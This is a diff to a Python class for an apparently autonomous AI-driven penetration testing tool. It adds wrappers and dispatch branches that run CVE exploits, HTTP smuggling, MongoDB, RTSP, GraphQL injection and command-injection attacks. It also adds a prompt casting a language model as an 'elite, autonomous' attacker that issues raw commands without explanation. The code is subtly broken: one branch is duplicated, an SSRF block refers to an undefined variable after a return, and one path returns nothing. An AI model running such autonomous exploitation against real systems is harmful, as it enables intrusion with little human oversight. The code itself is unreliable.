+                    target_url=target_url,
+                    ai_model_instance=self, # Pass self to access _get_ai_response
+                    log_func=self._log,
+                    report_generator=self.report_generator,
+                    ai_name=ai_name
+                )
+            )
+            self._log(f"[CVE Exploitation] Finished running exploit_cve for {cve_id}.")
+            return exploitation_results
+        except Exception as e:
+            self._log(f"[CRITICAL-ERROR] Synchronous CVE exploitation wrapper failed for {cve_id}: {e}")
+            return []
+
+    def _sync_perform_http_smuggling_attack(self, target_url, headers=None, cookies=None, timeout=15):
+        """
+        Synchronous wrapper to call the async perform_http_smuggling_attack function.
+        Manages its own asyncio event loop to avoid conflicts with existing synchronous code.
+        """
+        self._log(f"[HTTP Smuggling] Attempting to run perform_http_smuggling_attack for {target_url} synchronously.")
+        try:
+            # Get or create a new event loop for this thread
+            try:
+                loop = asyncio.get_event_loop()
+            except RuntimeError:
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+            
+            # Run the async perform_http_smuggling_attack function
+            smuggling_results = loop.run_until_complete(
+                perform_http_smuggling_attack(
+                    target_url=target_url,
+                    headers=headers,
+                    cookies=cookies,
+                    timeout=timeout
+                )
+            )
+            self._log(f"[HTTP Smuggling] Finished running perform_http_smuggling_attack for {target_url}.")
+            return smuggling_results
+        except Exception as e:
+            self._log(f"[CRITICAL-ERROR] Synchronous HTTP Smuggling wrapper failed for {target_url}: {e}")
+            return []
 
 # =================================================================================
 # 2. Scanning and Information Gathering
@@ -2341,7 +4213,7 @@ class FullAIModeRunner:
         
         return None
 
-    def _execute_internal_function_call(self, call_string):
+    async def _execute_internal_function_call(self, call_string):
         """
         Executes an internal Python function call suggested by the AI.
         Expected format: "INTERNAL_FUNC:function_name({'arg_name': 'val', ...})"
@@ -2448,6 +4320,92 @@ class FullAIModeRunner:
                     self._log("[INFO] SSRF scan completed. No vulnerabilities found.")
                     return json.dumps({"status": "info", "message": "No SSRF vulnerabilities found."})
 
+            elif func_name == "perform_exposed_services_attack":
+                # For exposed services, we don't have method/data/headers/cookies in the same way
+                # as web attacks. The function directly uses asyncio.open_connection.
+                # We pass the runner's target, and the runner's report_generator and _log method.
+                # We can pass self (the FullAIModeRunner instance) as 'output' and 'report'
+                # because it has a _log method and a report_generator attribute.
+                exposed_services_results = await perform_exposed_services_attack(
+                    target=args.get("target", self.target),
+                    output=self, # Pass self as output, it has _log method
+                    report=self.report_generator,
+                    session_cookies=args.get("session_cookies")
+                )
+                if exposed_services_results:
+                    # The perform_exposed_services_attack function already adds findings to report_generator
+                    self._log(f"[SUCCESS] Exposed Services scan completed. Found {len(exposed_services_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": exposed_services_results})
+                else:
+                    self._log("[INFO] Exposed Services scan completed. No vulnerabilities found.")
+                    return json.dumps({"status": "info", "message": "No Exposed Services vulnerabilities found."})
+
+            elif func_name == "perform_mongodb_attack":
+                mongodb_results = await perform_mongodb_attack(
+                    target=args.get("target", self.target),
+                    output=self,
+                    report=self.report_generator,
+                    session_cookies=args.get("session_cookies")
+                )
+                if mongodb_results:
+                    # The perform_mongodb_attack function already adds findings to report_generator
+                    self._log(f"[SUCCESS] MongoDB scan completed. Found {len(mongodb_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": mongodb_results})
+                else:
+                    self._log("[INFO] MongoDB scan completed. No vulnerabilities found.")
+            elif func_name == "perform_rtsp_attack":
+                rtsp_results = await perform_rtsp_attack(
+                    target=args.get("target", self.target),
+                    output=self,
+                    report=self.report_generator,
+                    session_cookies=args.get("session_cookies")
+                )
+                if rtsp_results:
+                    # The perform_rtsp_attack function already adds findings to report_generator
+                    self._log(f"[SUCCESS] RTSP scan completed. Found {len(rtsp_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": rtsp_results})
+                else:
+                    self._log("[INFO] RTSP scan completed. No vulnerabilities found.")
+                    return json.dumps({"status": "info", "message": "No RTSP vulnerabilities found."})
+
+            elif func_name == "perform_graphql_injection_attack":
+                graphql_results = await perform_graphql_injection_attack(
+                    target=args.get("target", self.target),
+                    output=self,
+                    report=self.report_generator,
+                    session_cookies=args.get("session_cookies")
+                )
+                if graphql_results:
+                    # The perform_graphql_injection_attack function already adds findings to report_generator
+                    self._log(f"[SUCCESS] GraphQL Injection scan completed. Found {len(graphql_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": graphql_results})
+                else:
+                    self._log("[INFO] GraphQL Injection scan completed. No vulnerabilities found.")
+                    return json.dumps({"status": "info", "message": "No GraphQL Injection vulnerabilities found."})
+
+            elif func_name == "perform_rtsp_attack":
+                rtsp_results = await perform_rtsp_attack(
+                    target=args.get("target", self.target),
+                    output=self,
+                    report=self.report_generator,
+                    session_cookies=args.get("session_cookies")
+                )
+                if rtsp_results:
+                    # The perform_rtsp_attack function already adds findings to report_generator
+                    self._log(f"[SUCCESS] RTSP scan completed. Found {len(rtsp_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": rtsp_results})
+                else:
+                    self._log("[INFO] RTSP scan completed. No vulnerabilities found.")
+                    return json.dumps({"status": "info", "message": "No RTSP vulnerabilities found."})
+                if ssrf_results:
+                    for finding in ssrf_results:
+                        self.report_generator.add_finding(finding)
+                    self._log(f"[SUCCESS] SSRF scan completed. Found {len(ssrf_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": ssrf_results})
+                else:
+                    self._log("[INFO] SSRF scan completed. No vulnerabilities found.")
+                    return json.dumps({"status": "info", "message": "No SSRF vulnerabilities found."})
+
             elif func_name == "perform_xxe_attack":
                 xxe_results = perform_xxe_attack(
                     target_url=args.get("target_url", self.target),
@@ -2509,6 +4467,41 @@ class FullAIModeRunner:
                 else:
                     self._log("[INFO] Brute Force Login scan completed. No successful logins found.")
                     return json.dumps({"status": "info", "message": "No successful logins found."})
+            
+            elif func_name == "perform_http_smuggling_attack":
+                smuggling_results = self._sync_perform_http_smuggling_attack(
+                    target_url=args.get("target_url", self.target),
+                    headers=args.get("headers"),
+                    cookies=args.get("cookies"),
+                    timeout=args.get("timeout", 15)
+                )
+                if smuggling_results:
+                    for finding in smuggling_results:
+                        self.report_generator.add_finding(finding)
+                    self._log(f"[SUCCESS] HTTP Smuggling scan completed. Found {len(smuggling_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": smuggling_results})
+                else:
+                    self._log("[INFO] HTTP Smuggling scan completed. No vulnerabilities found.")
+                    return json.dumps({"status": "info", "message": "No HTTP Smuggling vulnerabilities found."})
+
+            elif func_name == "perform_cmdi_attack":
+                cmdi_results = await perform_cmdi_attack(
+                    target=args.get("target", self.target),
+                    form_to_test=args.get("form_to_test"),
+                    output=self,
+                    tech=args.get("tech", {}),
+                    report=self.report_generator,
+                    session_cookies=args.get("session_cookies"),
+                    ai_enabled=True # Always enable AI for CMDi in full AI mode
+                )
+                if cmdi_results:
+                    for finding in cmdi_results:
+                        self.report_generator.add_finding(finding)
+                    self._log(f"[SUCCESS] Command Injection scan completed. Found {len(cmdi_results)} potential vulnerabilities.")
+                    return json.dumps({"status": "success", "findings": cmdi_results})
+                else:
+                    self._log("[INFO] Command Injection scan completed. No vulnerabilities found.")
+                    return json.dumps({"status": "info", "message": "No Command Injection vulnerabilities found."})
 
             # Add other internal functions here as they are implemented
             else:
@@ -2522,6 +4515,26 @@ class FullAIModeRunner:
         """The main AI-driven attack loop."""
         self._log("--- Starting Phase 2: AI-Driven Attack ---")
 
+        # Step 1: AI analyzes scan results to get attack plans
+        attack_plans = ai_analyze_scan_results(scan_results)
+        cve_attacks = attack_plans.get("cve_attacks", [])
+        generic_attacks = attack_plans.get("generic_attacks", []) # Keep for later if AI doesn't explicitly call them
+
+        # Step 2: Prioritize and execute CVE exploits
+        if cve_attacks:
+            self._log(f"[+] Identified {len(cve_attacks)} CVEs for exploitation: {', '.join(cve_attacks)}")
+            for cve_id in cve_attacks:
+                self._log(f"[+] Attempting to exploit CVE: {cve_id}")
+                try:
+                    # Call the synchronous wrapper for the async exploit_cve function
+                    self._sync_exploit_cve(cve_id, self.target, "AI_Orchestrator")
+                except Exception as e:
+                    self._log(f"[ERROR] Failed to execute CVE exploit for {cve_id}: {e}")
+                self._log(f"[+] Finished attempting exploit for CVE: {cve_id}")
+        else:
+            self._log("[INFO] No specific CVEs identified for exploitation.")
+
+        # Step 3: Continue with AI-driven generic attack loop (existing logic)
         initial_prompt = f"""
 You are an elite, autonomous penetration testing AI. Your goal is to find and exploit vulnerabilities in the target: {self.target}.
 You will proceed step-by-step. At each step, you will be given the results of your previous action and must decide on the next one.
@@ -2561,6 +4574,10 @@ You can respond in two ways:
      Performs brute-force login attempts against a login form.
      Use this function when you identify a login page and want to test for weak credentials.
      Example: `INTERNAL_FUNC:perform_brute_force_login({{'target_url': '{self.target}', 'login_path': '/login.php', 'username_field': 'user', 'password_field': 'pass', 'success_indicator': 'Welcome'}})`
+   - `perform_cmdi_attack({{target: str, form_to_test: dict=None, tech: dict=None, session_cookies: dict=None}})`:
+     Performs Command Injection attacks against the `target`.
+     Use this function when you suspect command injection vulnerabilities.
+     Example: `INTERNAL_FUNC:perform_cmdi_attack({{'target': '{self.target}'}})`
 
 Do not provide any explanation, just the raw command OR the internal function call. Start with analysis and enumeration.
 If you believe the test is complete or you cannot proceed, respond with the single word: "COMPLETE".
